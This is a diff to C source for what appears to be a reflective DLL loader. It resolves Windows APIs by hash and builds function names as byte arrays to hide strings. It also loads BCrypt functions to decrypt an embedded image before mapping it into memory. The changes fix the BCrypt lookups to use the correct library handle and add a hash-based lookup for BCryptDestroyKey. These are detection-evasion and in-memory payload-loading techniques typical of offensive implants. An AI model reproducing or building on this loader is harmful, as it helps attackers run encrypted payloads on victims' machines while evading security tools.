@@ -40,6 +40,8 @@
 #define LDRLOADDLL_HASH					0xbdbf9c13
 #define LDRGETPROCADDRESS_HASH			0x5ed941b5
 
+#define BCRYPTDESTROYKEYHASH			0x0D11B053
+
 
 #define HASH_KEY						13
 
@@ -214,6 +216,7 @@ ULONG_PTR LoadDLL(PBYTE dllData, DWORD dwFunctionHash, LPVOID lpUserData, DWORD 
 	BYTE sFlushInstructionCache[] = { 'F', 'l', 'u', 's', 'h', 'I', 'n', 's', 't', 'r', 'u', 'c', 't', 'i', 'o', 'n', 'C', 'a', 'c', 'h', 'e' };
 	BYTE sGetNativeSystemInfo[] = { 'G', 'e', 't', 'N', 'a', 't', 'i', 'v', 'e', 'S', 'y', 's', 't', 'e', 'm', 'I', 'n', 'f', 'o' };
 	BYTE sRtlAddFunctionTable[] = { 'R', 't', 'l', 'A', 'd', 'd', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', 'T', 'a', 'b', 'l', 'e' };
+	//BYTE sMessageBoxA[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A'};
 
 	BYTE sBCryptOpenAlgorithmProvider[] = { 'B', 'C', 'r', 'y', 'p', 't', 'O', 'p', 'e', 'n', 'A', 'l', 'g', 'o', 'r', 'i', 't', 'h', 'm', 'P', 'r', 'o', 'v', 'i', 'd', 'e', 'r' };
 	BYTE sBCryptGetProperty[] = { 'B', 'C', 'r', 'y', 'p', 't', 'G', 'e', 't', 'P', 'r', 'o', 'p', 'e', 'r', 't', 'y' };
@@ -275,7 +278,7 @@ ULONG_PTR LoadDLL(PBYTE dllData, DWORD dwFunctionHash, LPVOID lpUserData, DWORD 
 	FILL_STRING_WITH_BUF(aString, sLoadLibrary);
 	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pLoadLibraryA);
 
-	//FILL_STRING_WITH_BUF(aString, sMessageBox);
+	//FILL_STRING_WITH_BUF(aString, sMessageBoxA);
 	//pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pMessageBoxA);
 
 	if (!pVirtualAlloc || !pVirtualProtect || !pSleep ||
@@ -286,31 +289,37 @@ ULONG_PTR LoadDLL(PBYTE dllData, DWORD dwFunctionHash, LPVOID lpUserData, DWORD 
 	pLdrLoadDll(NULL, 0, &uCryptString, &cryptLib);
 
 	FILL_STRING_WITH_BUF(aString, sBCryptOpenAlgorithmProvider);
-	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pBCryptOpenAlgorithmProvider);
+	pLdrGetProcAddress(cryptLib, &aString, 0, (PVOID*)&pBCryptOpenAlgorithmProvider);
 
 	FILL_STRING_WITH_BUF(aString, sBCryptGetProperty);
-	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pBCryptGetProperty);
+	pLdrGetProcAddress(cryptLib, &aString, 0, (PVOID*)&pBCryptGetProperty);
 
 	FILL_STRING_WITH_BUF(aString, sBCryptSetProperty);
-	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pBCryptSetProperty);
+	pLdrGetProcAddress(cryptLib, &aString, 0, (PVOID*)&pBCryptSetProperty);
 
 	FILL_STRING_WITH_BUF(aString, sBCryptGenerateSymmetricKey);
-	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pBCryptGenerateSymmetricKey);
+	pLdrGetProcAddress(cryptLib, &aString, 0, (PVOID*)&pBCryptGenerateSymmetricKey);
 
 	FILL_STRING_WITH_BUF(aString, sBCryptDecrypt);
-	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pBCryptDecrypt);
+	pLdrGetProcAddress(cryptLib, &aString, 0, (PVOID*)&pBCryptDecrypt);
 
 	FILL_STRING_WITH_BUF(aString, sBCryptCloseAlgorithmProvider);
-	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pBCryptCloseAlgorithmProvider);
+	pLdrGetProcAddress(cryptLib, &aString, 0, (PVOID*)&pBCryptCloseAlgorithmProvider);
 
-	FILL_STRING_WITH_BUF(aString, sBCryptDestroyKey);
-	pLdrGetProcAddress(library, &aString, 0, (PVOID*)&pBCryptDestroyKey);
+	// WTF
+	pBCryptDestroyKey = (BCRYPTDESTROYKEY)GetProcAddressWithHash(BCRYPTDESTROYKEYHASH);
 
+	//FILL_STRING_WITH_BUF(aString, sBCryptDestroyKey);
+	//pLdrGetProcAddress(cryptLib, &aString, 0, (PVOID*)&pBCryptDestroyKey);
+	// END OF WTF
+	
 	if (!pBCryptOpenAlgorithmProvider || !pBCryptGetProperty || !pBCryptSetProperty || !pBCryptGenerateSymmetricKey || 
 		!pBCryptDecrypt || !pBCryptCloseAlgorithmProvider || !pBCryptDestroyKey) {
 		return 0;
 	}
-	
+
+	//pMessageBoxA(NULL, msg, msg, 0x00000001L);
+
 	///
 	// STEP 2: load our image into a new permanent location in memory
 	///
